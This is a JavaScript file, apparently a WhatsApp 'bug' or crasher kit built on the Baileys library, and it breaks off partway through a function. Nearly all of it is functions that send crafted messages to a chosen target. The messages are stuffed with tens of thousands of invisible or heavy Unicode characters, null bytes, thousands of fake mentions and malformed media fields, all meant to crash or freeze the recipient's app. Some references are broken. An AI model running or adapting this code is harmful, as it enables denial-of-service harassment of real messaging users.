const {
    generateWAMessageFromContent,
    generateMessageID
} = require("@whiskeysockets/baileys");
const chalk = require('chalk');

// Utility Functions
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ==================== CORE BUG FUNCTIONS ==================== //

async function N3xithBlank(sock, X) {
    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363321780343299@newsletter",
            newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
            caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
            inviteExpiration: "999999999"
        }
    };

    try {
        await sock.relayMessage(X, msg, {
            participant: { jid: X },
            messageId: sock.generateMessageTag?.() || generateMessageID()
        });
    } catch (error) {
        console.error(`❌ Gagal mengirim bug ke ${X}:`, error.message);
    }
}

async function FcPay1hit(target) {
  const NanMsg = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      requestFrom: target, 
      expiryTimestamp: Date.now() + 8000, 
      amount: 5,
      contextInfo: {
        externalAdReply: {
          title: "\u0000".repeat(500) +
                 "@".repeat(3000) +
                 "\u200D".repeat(500) + 
                 "ꦾ".repeat(2100) +
                 "\u202E".repeat(20) + 
                 "ꦽ".repeat(2000) +
                 "[[[{".repeat(100) + 
                 "X".repeat(5000),
          
          body: "\u0000".repeat(999), 
          mimetype: 'audio/mpeg',
          caption: "ꦾ".repeat(5000) + "@".repeat(1000), 
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null,
          
          contextInfo: {
            mentionedJid: Array(100).fill(target),
            forwardingScore: 999999,
            isForwarded: true,
            externalAdReply: {
              title: "vxz: " + "@".repeat(2900),
              contextInfo: {
                mentionedJid: Array(50).fill(target)
              }
            }
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, NanMsg, {
      participant: { jid: target },
      messageId: null,
      userJid: target, 
      quoted: null
    });
    console.log(chalk.red("Succesfully sending bug to target"));
  } catch (error) {
    console.log(chalk.red("❌ eror jir: ", error.message));
  }
}   

async function occolotopysV2(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  let CallAudio = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch { }
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let AudioLite = CallAudio();
  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let BufferDelete = sock.createParticipantNodes.bind(sock);
  let encodeBuffer = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let participateNode = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(
      participateNode.map(async ({ recipientJid: jid, message: msg }) => {

        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;

        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

        let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));

        return AudioLite.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [{
              tag: 'enc',
              attrs: { v: '2', type, ...extraAttrs },
              content: ciphertext
            }]
          };
        });

      })
    );

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let BytesType = crypto.randomBytes(32);
  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);

  let { nodes: destinations, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: '0' }
    );

  let DecodeCall = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        { tag: "net", attrs: { medium: "3" } },
        {
          tag: "capability",
          attrs: { ver: "1" },
          content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
        },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },

        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };
  await sock.sendNode(DecodeCall);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "X",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });
}

async function PaymentNoButton(sock, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      interactiveMessage: {
        message: {
          requestPaymentMessage: {
            currencyCodeIso4217: "IDR",
            amount1000: 25000 * 1000, // Rp25.000
            requestFrom: target,
            noteMessage: {
              extendedTextMessage: {
                text: "Pembayaran layanan Oleh - FaiqOffc"
              }
            },
            expiryTimestamp:
              Math.floor(Date.now() / 1000) + 86400,
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

async function despiczy(sock, X) {
  let war = {
       viewOnceMessage: {
             message: {
                  locationMessage: {
                       degreesLatitude: 9999999,
                       degreesLongitude: -999999,
                       name: "\u0000".repeat(60000), 
                          inviteLinkGroupTypeV2: "DEFAULT",
                          clickToWhatsappCall: true,
                          contextInfo: {
                             remoteJid: "status@broadcast",
                             participant: "null",
                             mentionedJid: [
                               target,
                               "0@s.whatsapp.net",
                               ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) +
                        "@s.whatsapp.net"
                               ),
                           ],
                           businessMessageForwardInfo: {
                              businessOwnerJid: "null"
                            }
                         },
                        interactiveResponseMessage: {
                           header: {
                              text: "Come On Baby" + "ꦽ".repeat(70000),
                           },
                            nativeFlowResponseMessage: {
                                name: "send_location", 
                                buttonParamsJson: JSON.stringify({
                                  display_text: "fefek" + "ꦽ".repeat(50000)
                                })
                             }
                         }
                     }
                 }
             }
         };
         
 let war2 = {
      viewOnceMessage: {
            message: {
                 stickerMessage: {
                     url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA",
                     fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
                     fileEncSha256: "LaaBTYFkIZxif2lm2TfSIt9yATBfYd9w86UxehMa4rI=",
                     mediaKey: "7XhMJyn+ss8sVb2qs36Kh9+lrGVwu29d1IO0ZjHa09A=",
                     mimetype: "image/webp",
                     height: 9999,
                     width: 9999,
                     directPath: "/o1/v/t24/f2/m232/AQM0qk2mbkdEyYjXTiq8Me6g5EDPbTWZdwL8hTdt4sRW3GcnYOxfEDQMazhPBpmci3jUgkzx5j1oZLT-rgU1yzNBYB-VtlqkGX1Z7HCkVA",
                     fileLength: "22254",
                     mediaKeyTimestamp: "1761396583",
                     isAnimated: false,
                     stickerSentTs: Date.now(),
                     isAvatar: false,
                     isAiSticker: false,
                     isLottie: false,
                     contextInfo: {
                        participant: X,
                        mentionedJid: [
                           target,
                           ...Array.from({ length: 1900 }, () => 
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                          )
                       ],
                       remoteJid: "X",
                          stanzaId: "1234567890ABCDEF",
                             quotedMessage: {
                               albumInviteMessage: {
                                  serviceType: 3,
                                  expiryTimestamp: Date.now() + 1814400000
                               }
                           }
                       }
                   }
               }
           }
       };
       
 let war3 = {
      groupStatusMentionMessageV2: {
            message: {
                 pollResultSnapshotMessage: {
                      pollCreationMessageKey: {
                         remoteJid: target,
                         fromMe: true,
                         id: "xnxx.com"
                      },
                      documentMessage: {
                         url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                         mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                         fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                         fileLength: "9999999999999",
                         pageCount: 9007199254740991,
                         mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                         fileName: "Syukhronཀ",
                         fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                         directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                         mediaKeyTimestamp: "1723855952",
                         contactVcard: false,
                         thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                         thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                         thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z"
                     },
                     contextInfo: {
                        participant: X,
                        mentionedJid: [
                           target,
                           "0@s.whatsapp.net",
                           ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                       ]
                   }
               }
           }
       }
   };
   
   const ara = [
     generateWAMessageFromContent(target, msg, {}),
     generateWAMessageFromContent(target, war2, {}),
     generateWAMessageFromContent(target, war3, {})
   ];
   
     for (const awh of ara) {
       await sock.relayMessage("status@broadcast", awh, {
         messageId: null,
         statusJidList: [X],
       });
    }
    
   await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "BOLD"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(10000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );
  console.log(chalk.red(`Despiczy Sending Bug ${target}`));
}

async function blankxzvr(sock, target) {
    const xwarxara = await generateWaMessageFromcontent(target,  {
    message: {
      interactiveMessage: {
        header: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: "1402222",
            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: "xwarrxxx.js",
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath: "//v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
            mediaKeyTimestamp: `1750124469`
          },
          hasMediaAttachment: true
        },
        body: {
          text: "Ӿ₩₳ɽɽ Ł₴ Ⱨɇɽɇɇɇɇ" + "{".repeat(70000)
        },
        nativeFlowMessage: {
              messageParamsJson: "{".repeat(90000)
        },
        contextInfo: {
          mentionedJid: [target],
          groupMentions: [
            {
              groupJid: target,
              groupSubject: "ALL_CHAT",
              groupMetadata: {
                creationTimestamp: Date.now(),
                ownerJid: "1@s.whatsapp.net",
                adminJids: ["1@s.whatsapp.net", "1@s.whatsapp.net"]
              }
            }
          ],
          externalContextInfo: {
            customTag: "₣ʉ₵₭ Ɏøʉ ฿ɽøøøø",
            securityLevel: 0,
            referenceCode: 9741,
            timestamp: 9741,
            messageId: `MSG_${Math.random().toString(36).slice(2)}`,
            userId: "global"
          },
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1402222",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
              fileName: "xwarrrx.js",
              fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1750124469
            }
          }
        }
      }
    }
  }, {});
      await sock.relayMessage(target, xwarxara.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
   
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: ".",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: " null " + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
  
  console.log(`Succes Send Bug Blank Android ${target}`);
  
}

async function Xwrghkaz(sock, target) {
    const pler = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
      fileLength: "62265",
      height: 1080,
      width: 1080,
      mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
      fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
      directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
      mediaKeyTimestamp: "1756530813",
      jpegThumbnail: Buffer.from(
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
        "base64"
      ),
      contextInfo: {},
      scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
      scanLengths: [7808, 22667, 9636, 22154],
      midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
    };

    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: 
                      `Jule Enak Ah\n` +
                      "\u0000" +
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          imageMessage: pler,
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(900000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(900)}","url":"https://t.me/Jcodeest4r","merchant_url":"https://google.com"}`,
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: `{"title":"Section ${"ꦾ".repeat(900)}","sections":[{"title":"Janda","rows":[]}]}`,
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(9000)}","title":"Crash","id":".clickme"}`,
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        mentions: ["13135550002@s.whatsapp.net"],
      }
    );    
  
    await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "𝕷𝖔𝖛𝖊 𝖄𝖔𝖚" + "𝖂𝖍𝖆𝖙 𝖙𝖍𝖊 𝖋𝖚𝖝".repeat(10000),
        publisher: "𝕷𝖔𝖛𝖊 𝖄𝖔𝖚" + "𝖂𝖍𝖆𝖙 𝖙𝖍𝖊 𝖋𝖚𝖝".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["☠️"],
            accessibilityLabel: "jule",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "9999999999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "𝕷𝖔𝖛𝖊 𝖄𝖔𝖚" + "𝖂𝖍𝖆𝖙 𝖙𝖍𝖊 𝖋𝖚𝖝".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function XvZDonger(sock, target) {
  try {
    const xavienz1 = {
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(50000),
            publisher: "𑜦𑜠".repeat(50000),
            caption: " 🩸⃟Xavienzz Attackᬊ ",
            stickers: Array.from({ length: 100 }, () => ({
              fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
              isAnimated: false,
              emojis: ["🧪", "⚠️"],
              accessibilityLabel: "",
              stickerSentTs: "PnX-ID-msg",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "image/webp"
            })),
            fileLength: "1073741824000",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
            contextInfo: {
              remoteJid: target,
              participant: "0@s.whatsapp.net",
              stanzaId: "1234567890ABCDEF",
              mentionedJid: [
                target,
                ...Array.from({ length: 1950 }, () =>
                  "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
                )
              ]
            },
            packDescription: "",
            mediaKeyTimestamp: Date.now(),
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "999999999",
            stickerPackOrigin: "USER_CREATED"
          }
        }
      }
    };

    const msg1 = await generateWAMessageFromContent(target, xavienz1, {});
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

    const xavienz2 = {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "🩸⃟Xavienzz Attackᬊ" + "ꦽ".repeat(20000),
          address: "ꦽ".repeat(20000) + "ោ៝".repeat(10000),
          url: "https://t.me/" + "Xavienzz" + "ꦽ".repeat(20000),
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "ꦽ".repeat(15000),
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: "🩸⃟Xavienzz Attackᬊ" + "ꦽ".repeat(25000)
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    };

    const msg2 = await generateWAMessageFromContent(target, xavienz2,
      { userJid: sock?.user?.id }
    );

    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });

  } catch (err) {
    console.error("Error:", err);
  }
}

async function TrueIos(target) {
  await babi.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        locationMessage: {
          degreesLatitude: 999.27838,
          degreesLongitude: -127.929,
          name: `X` + "𑇂𑆵𑆴𑆿".repeat(60000),
          url: null,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, z) => `628${z + 1}@s.whatsapp.net`
            ),
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "Video",
                jpegThumbnail: null,
                caption: "𑇂𑆵𑆴𑆿".repeat(60000)
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function CardsResp(target) {
  const cards = [];
